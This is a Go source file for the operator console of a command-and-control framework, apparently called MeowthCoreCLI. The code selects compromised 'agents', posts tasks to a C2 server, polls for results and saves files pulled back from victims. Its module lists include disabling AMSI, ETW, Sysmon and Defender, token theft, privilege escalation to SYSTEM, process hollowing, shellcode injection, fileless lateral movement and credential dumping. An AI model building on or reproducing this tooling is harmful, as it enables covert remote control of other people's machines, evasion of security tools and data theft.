package cmd

import (
	"bufio"
	"encoding/base64"
	"errors"
	"fmt"
	"os"
	"strings"
	"time"

	"github.com/desertbit/grumble"
	"github.com/latortuga71/MeowthCoreCLI/internal"
	"github.com/manifoldco/promptui"
)
var simple_modules = [...]string{
	"whoami",
	"ps",
	"lsa",
	"ping",
	"disable-amsi",
	"disable-etw",
	"disable-sysmon",
    "disable-defender",
    "enable-defender",
	"get-system",
    "get-trustedinstaller",
	"pwd",
	"rev2self",
    "enum-tokens",
}

var medium_modules = [...]string {
    "sleep",
    "set-jitter",
	"runas",
	"run",
	"shell",
	"cd",
	"mkdir",
	"rmdir",
	"enable-priv",
	"ls",
    "fileless-lateral",
	"ping-sweep",
	"turtle-dump",
	"steal-token",
	"admin-check",
    "download",
    "unhook-dll",
}
var complex_modules = [...]string {
    "upload",
    "process-hollow",
	"shinject",
	"execute-assembly",
	"spawn-inject",
}


func init(){
    interactCommand := &grumble.Command{
        Name:"interact",
        Help: "choose an agent to task",
        Run: chooseAgent,
    }
    App.AddCommand(interactCommand)
}


func removeIndex(s []TaskResult, index int) [] TaskResult{
    return append(s[:index],s[index+1:]...)
}

func pollForNewTaskResults(){
    for {
        if CurrentAgent.agent == nil {
            time.Sleep(time.Second * 10)
            continue
        }
        PendingTaskQueue.Lock()
        //var idxArray []int
        for idx, taskResult := range PendingTaskQueue.results {
            if taskResult.Result != "" {
                continue
            }
	        var task TaskResult
            tid := taskResult.Id
            id := CurrentAgent.agent.Metadata.ID
	        target := fmt.Sprintf("%s%s%s%s%s",FullServerURI,"Agents/",id,"/tasks/",tid)
	        err := internal.GetResult(target, &task)
	        if err != nil {
                continue
	        }
            if len(strings.TrimSpace(task.Result)) == 0{
                task.Result = "Complete"
            }
            if (strings.Contains(task.Result,"MEOWTHDOWNLOAD")){
                err,lenBytes := decodeFileDownload(task.Result,task.Id)
                if err != nil {
                    task.Result = "Failed to download file"
                }
                task.Result = fmt.Sprintf("Download %d bytes to ./%s.meowth",lenBytes,task.Id)
            }
            PendingTaskQueue.results[idx].Result = task.Result
            //idxArray = append(idxArray,idx)
            fmt.Printf("\n::: Result ::: \n%s\n",task.Result)
        }
        PendingTaskQueue.Unlock()
        time.Sleep(time.Second * 5)
    }
}

func decodeFileDownload(base64File string,taskId string) (error,int) {
    file, err := base64.StdEncoding.DecodeString(base64File[14:])
    if err != nil {
        return err,0
    }
    osOut, err := os.OpenFile(taskId + ".meowth", os.O_WRONLY|os.O_CREATE, 0666)
    if err != nil {
        return err,0
    }
    lengthWrote, err := osOut.Write(file)
    return nil,lengthWrote
}


func chooseAgent(c *grumble.Context) error {
    if (len(AgentList.agents) == 0){
        return errors.New("No Agents Online.") 
    }
	prompt := promptui.Select{
		Label: "Select Agent",
		Items: AgentList.agents,
	}
	idx, _, err := prompt.Run()
	if err != nil {
		return err
	}
	CurrentAgent.agent = &AgentList.agents[idx]
    go pollForNewTaskResults()
	agentShell()
    return nil
}

func agentShell() error {
	reader := bufio.NewReader(os.Stdin)
	for {
        fmt.Printf(CurrentAgent.agent.Metadata.ID + ":::" + CurrentAgent.agent.Metadata.Username + "@" + CurrentAgent.agent.Metadata.Hostname + " > ")
		tmp, err := reader.ReadString('\n')
		if err != nil {
            CurrentAgent.Lock()
			CurrentAgent.agent = nil
            CurrentAgent.Unlock()
			return err
		}
		cmd := strings.TrimRight(tmp, "\n")
        id := CurrentAgent.agent.Metadata.ID
		switch cmd {
		case "exit":
			fmt.Println("Exiting...")
            CurrentAgent.Lock()
			CurrentAgent.agent = nil
            CurrentAgent.Unlock()
			return nil
		case "exit\r":
			fmt.Println("Exiting...")
            CurrentAgent.Lock()
			CurrentAgent.agent = nil
            CurrentAgent.Unlock()
			return nil
		case "help":
			showModules()	
			break
		case "?":
			showModules()	
			break
        case " ":
            break
        case "":
            break
		default:
			handleTask(cmd,id)
			break
		}
		time.Sleep(time.Millisecond * 500)
	}
}

func showModules(){
	fmt.Println("### Module List ###")
    for x := range simple_modules{ 
        fmt.Println(simple_modules[x])
    }
    for x := range medium_modules {
        fmt.Println(medium_modules[x])
    }
    for x := range complex_modules {
        fmt.Println(complex_modules[x])
    }
}

func handleTask(cmd string,id string) error {
    if (len(strings.TrimSpace(cmd)) == 0){
        return nil
    }
	switch taskLevel(cmd){
    case "simple":
        return handleSimpleTask(cmd,id)
    case "medium":
        return handleMediumTask(cmd,id)
    case "complex":
        return handleComplexTask(cmd,id)
	default:
        return handleDefaultShellTask(cmd,id)
	}
}

func taskLevel(task string) string {
    for _, module := range simple_modules {
        if task == module {
            return "simple"
        }
    }
    for _, module := range medium_modules{
        if task == module {
            return "medium"
        }
    }
    for _, module := range complex_modules{
        if task == module {
            return "complex"
        }
    }
    return "not found"
}

// simple only sends taskname
// medium send taskname and args
// comples sends args taskname and base64 encoded file
func handleSimpleTask(cmd string,agent_id string) error {
	task := &Task{
		Command: cmd,
	}
	target := fmt.Sprintf("%s%s%s",FullServerURI,"Agents/",agent_id)
	err,taskid:= internal.PostTask(target,&task)	
	if err != nil {
		return err
	}
    r := TaskResult{
        Id: taskid,
        Result: "",
    }
    PendingTaskQueue.Lock()
    PendingTaskQueue.results = append(PendingTaskQueue.results,r)
    PendingTaskQueue.Unlock()
	return nil 
}


func handleMediumTask(cmd string,agent_id string) error {
    // get args for medium task
    var argString string
    var cmdArgs []string
    var task *Task
    prompt := promptui.Prompt{
        Label: "Arguments",
        Default: argString,
    }
    result,_ := prompt.Run()
    if result != "" {
        cmdArgs = strings.Split(result," ")
	    task = &Task{
	    	Command: cmd,
            Args:cmdArgs,
	    }
    } else {
	    task = &Task{
	    	Command: cmd,
	    }
    }
	target := fmt.Sprintf("%s%s%s",FullServerURI,"Agents/",agent_id)
	err,taskid:= internal.PostTask(target,&task)	
	if err != nil {
		return err
	}
    r := TaskResult{
        Id: taskid,
        Result: "",
    }
    PendingTaskQueue.Lock()
    PendingTaskQueue.results = append(PendingTaskQueue.results,r)
    PendingTaskQueue.Unlock()
	return nil 
}
func handleComplexTask(cmd string,agent_id string) error{
    // get args for medium task
    var argString string
    var filePath string
    var cmdArgs []string
    var task *Task
    prompt := promptui.Prompt{
        Label: "Arguments",
        Default: argString,
    }
    result,_ := prompt.Run()
    if result != "" {
        cmdArgs = strings.Split(result," ")
	    task = &Task{
	    	Command: cmd,
            Args:cmdArgs,
	    }
    } else {
	    task = &Task{
	    	Command: cmd,
	    }
    }
    promptFile := promptui.Prompt{
        Label: "File",
        Default:filePath,
    }
    resultPath , _  := promptFile.Run()
    // ConvertFile to base64
    if _, err := os.Stat(resultPath); os.IsNotExist(err){
        return err
    }
    err, b64File := internal.ConvertFileToBase64(resultPath)
    if err != nil {
        return err 
    }
    task.File = b64File
	target := fmt.Sprintf("%s%s%s",FullServerURI,"Agents/",agent_id)
	err,taskid:= internal.PostTask(target,&task)	
	if err != nil {
		return err
	}
    r := TaskResult{
        Id: taskid,
        Result: "",
    }
    PendingTaskQueue.Lock()
    PendingTaskQueue.results = append(PendingTaskQueue.results,r)
    PendingTaskQueue.Unlock()
	return nil 
}

func handleDefaultShellTask(args string, agent_id string) error {
	task := &Task{
		Command: "shell",
        Args: strings.Split(args," "),
	}
	target := fmt.Sprintf("%s%s%s",FullServerURI,"Agents/",agent_id)
	err,taskid:= internal.PostTask(target,&task)	
	if err != nil {
		return err
	}
    r := TaskResult{
        Id: taskid,
        Result: "",
    }
    PendingTaskQueue.Lock()
    PendingTaskQueue.results = append(PendingTaskQueue.results,r)
    PendingTaskQueue.Unlock()
	return nil 
}
